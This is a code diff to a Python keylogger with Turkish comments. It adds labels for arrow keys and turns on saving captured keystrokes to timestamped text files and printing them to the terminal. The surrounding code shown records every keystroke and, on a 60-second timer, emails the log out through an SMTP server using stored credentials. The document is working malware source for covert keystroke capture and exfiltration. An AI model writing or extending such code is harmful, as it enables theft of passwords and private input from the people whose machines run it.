@@ -4,9 +4,8 @@ from threading import Timer
 from datetime import datetime
 import sifre
 
-MAIL_USER = str(sifre.MAIL_USER)
-MAIL_ADDRESS = str(sifre.MAIL_ADDRESS)
-MAIL_SIFRE = str(sifre.MAIL_SIFRE)
+MAIL_USER = str(sifre.MAIL_USER) # " " arasina e-mail addressinizi
+MAIL_SIFRE = str(sifre.MAIL_SIFRE) # " " arasina sifrenizi yazin
 MAIL_SMTP = "smtp.ethereal.email"
 RAPOR_SURE = 60
 
@@ -39,12 +38,18 @@ class Keylogger:
                 name = "[^]"
             elif name == "!":
                 name = "[!]"
+            elif name == "down":
+                name = "[ALT_TUS]"
+            elif name == "right":
+                name = "[SAG_TUS]"
+            elif name == "left":
+                name = "[SOL_TUS]"
+            elif name == "up":
+                name = "[ÜST_TUS]"
         #elif name == " ":
             #name = "[BOSLUK]"  # BOSLUK YERINE [BOSLUK] YAZMASINI SAGLAR
         self.log += name
 
-    def dosyaya_kaydet(self, icerik):
-        pass
 
     def dosya_isimlendir(self):
         baslama_zamani = str(self.baslangic)
@@ -54,7 +59,7 @@ class Keylogger:
     def dosya_olustur(self):
         with open(f"{self.dosya_adi}.txt", "w+") as d:
             print(self.log, file=d)
-        #print(f"[+] Yeni girdi: {self.dosya_adi}.txt") # Terminalden cikti verir
+        print(f"[+] Yeni girdi: {self.dosya_adi}.txt") # Terminalden cikti verir
 
     def mail_gonderme(self, icerik, mail=MAIL_USER, sifre=MAIL_SIFRE):
         server = smtplib.SMTP(host=MAIL_SMTP, port=587)
@@ -70,9 +75,9 @@ class Keylogger:
             self.dosya_olustur()
             if self.rapor == "mail":
                 self.mail_gonderme(self.log, MAIL_USER,MAIL_SIFRE)
-            #elif self.rapor == "dosya":
-                #self.dosyaya_kaydet(self.log)
-            #print(f"[{self.dosya_adi} icine yazdirildi: {self.log}") # Terminalde yazdirilan loglari görme
+            elif self.rapor == "dosya":
+                self.dosya_olustur() #yönlendirme eklenebilir
+            print(f"[{self.dosya_adi} icine yazdirildi: {self.log}") # Terminalde yazdirilan loglari görme
             self.baslangic = datetime.strftime(datetime.today() , '%d-%m-%Y-%Hh-%Mm')
 
         zamanlayici = Timer(interval=RAPOR_SURE, function=self.icerik) # Multithread yapmasi icin zamanlayici döngü
